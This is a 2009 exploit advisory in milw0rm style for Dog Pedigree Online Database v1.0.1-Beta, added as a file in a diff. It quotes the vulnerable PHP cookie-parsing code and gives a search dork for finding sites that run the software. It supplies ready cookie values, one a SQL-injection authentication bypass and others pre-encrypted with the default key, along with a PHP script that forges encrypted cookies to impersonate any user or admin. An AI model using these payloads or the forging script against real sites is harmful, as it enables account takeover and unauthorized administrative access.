@@ -1,0 +1,229 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     INSECURE COOKIE HANDLING VULNERABILITIES		      	     |
+|--------------------------------------------------------------------------------------------|
+|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		     |
+|  CMS INFORMATION:	 -------------------------------------------------	             |
+|										             |
+|-->WEB: http://thewhippetarchives.net/twa_is_offline.php          	                     |
+|-->DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                     |
+|-->DEMO: N/A   	     			    					     |
+|-->CATEGORY: Genealogy									     |
+|-->DESCRIPTION: This project allows to setup and maintain a database for 	 	     |
+|		collecting (dog) pedigrees. The data will actually be collected...	     |
+|-->RELEASED: 2009-01-25								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: inurl:"printable_pedigree.php"				                     |
+|-->CATEGORY: COOKIE AUTH-BYPASS (SQLi) / INSECURE COOKIE HANDLING                           |
+|-->AFFECT VERSION: <= 1.0.1 Beta			 			             |
+|-->Discovered Bug date: 2009-05-08							     |
+|-->Reported Bug date: 2009-05-08							     |
+|-->Fixed bug date: 2009-05-12								     |
+|-->Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#######
+///////
+
+INTRO:
+
+///////
+#######
+
+
+Cookie name --> it could be configured, but any web change it.
+
+Cookie protection --> Active by default, but some Webs use it and other neither (Because it needs php_mcrypt extension).
+
+With cookie protection --> Any web change the $COOKIE_KEY value. Always by default
+
+
+
+###########################
+///////////////////////////
+
+COOKIE AUTH-BYPASS (SQLi):
+
+///////////////////////////
+###########################
+
+
+-----------
+VULN FILE:
+-----------
+
+
+Path --> [HOME_PATH]/php_users/htdocs/
+File --> users.php.inc
+Vuln function --> init()
+
+
+ function init() {
+
+....
+
+    $cookie = $_COOKIE[$USER_COOKIE];
+    if (isset($COOKIE_KEY)) {
+      	$iv = mcrypt_create_iv(mcrypt_get_iv_size (MCRYPT_BLOWFISH, MCRYPT_MODE_ECB), MCRYPT_RAND);
+      	$cookie = mcrypt_decrypt(MCRYPT_BLOWFISH, $COOKIE_KEY, base64_decode($cookie), MCRYPT_MODE_ECB, $iv);
+    }
+    $cookie = rtrim($cookie);  
+    $a = split('&', $cookie);
+    $i = 0;
+    while ($i < count($a)) {
+      $b = split ('=', $a[$i]);
+      $key = urldecode($b[0]);
+      $value = urldecode($b[1]);
+      $this->{$key} = $value;
+      $i++;
+    }
+    $this->id = $this->{'uid'};
+  }
+
+...
+
+---------
+EXPLOIT:
+---------
+
+
+1.-WITHOUT ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> email=&uid=-1%20or%201=1#&seclev=
+
+
+2.-WITH ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> Ffq9xizFlqX%2FLFytv2XsUILuolhabq3%2BN5A0%2B3ifmNdjLEIqh%2BKIXA%3D%3D
+
+			
+
+Return --> Admin account.
+
+
+##########################
+//////////////////////////
+
+INSECURE COOKIE HANDLING:
+
+//////////////////////////
+##########################
+
+
+<<<<-------+++++++++ Condition: Search e-mail and uid (it's not difficult) ++++++++++--------->>>>
+
+
+------
+NOTE:
+------
+
+
+Use an cookie builder (need php_mcrypt extension) 
+to encrypt the cookie value:
+
+<?php
+
+//Configure [real_email] and [real_uid] with your target
+
+$COOKIE_KEY="somethingRAndoM9871234whateveryoulike"; //user.conf by default
+$cookie="email=".urlencode('[real_email]')."&uid=[real_uid]&seclev=1";
+$iv = mcrypt_create_iv(mcrypt_get_iv_size (MCRYPT_BLOWFISH, MCRYPT_MODE_ECB), MCRYPT_RAND);
+$cookie = base64_encode(mcrypt_encrypt (MCRYPT_BLOWFISH, $COOKIE_KEY, $cookie, MCRYPT_MODE_ECB, $iv));
+print "Cookie crypted-urlencode -->".urlencode($cookie)."\n";
+
+?>
+
+
+-----
+PoC:
+-----
+
+
+1.-WITHOUT ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> email=[real_email]&uid=[real_uid]&seclev=1
+
+
+2.-WITH ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> Use PHP script above
+
+
+---------
+EXPLOIT:
+---------
+
+
+1.-WITHOUT ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> email=y3nh4ck3r@gmail.com&uid=2422&seclev=1
+
+
+2.-WITH ENCRYPTION:
+
+
+Add cookie --> Name ~> dogarchive_user_info
+
+	   --> Value ~> 7O%2By0gnSt4KItondpdwQThDciQY6aR3QfFGEvZQzUGQWNkYwIUI4lfiZ1WQgnEc%2B
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-19]
